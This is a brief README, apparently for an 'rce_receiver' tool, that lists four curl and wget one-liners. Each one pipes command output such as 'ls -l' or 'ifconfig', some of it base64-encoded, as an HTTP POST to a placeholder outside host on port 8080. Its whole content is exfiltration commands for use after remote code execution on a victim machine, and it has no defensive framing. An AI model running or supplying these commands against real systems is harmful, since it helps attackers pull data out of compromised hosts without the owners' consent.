# rce_receiver

### use curl or wget to transfer command output

`
ls -l | base64| curl -X POST -d @- http://x.x.x.x:8080/?b64=1
`

`
ls -l | curl -X POST -d @- http://x.x.x.x:8080/
`

`
wget --method=POST --body-data="$(ifconfig | base64)" "http://x.x.x.x:8080/?b64=1"
`

`
wget --method=POST --body-data="$(ifconfig)" "http://x.x.x.x:8080/
`
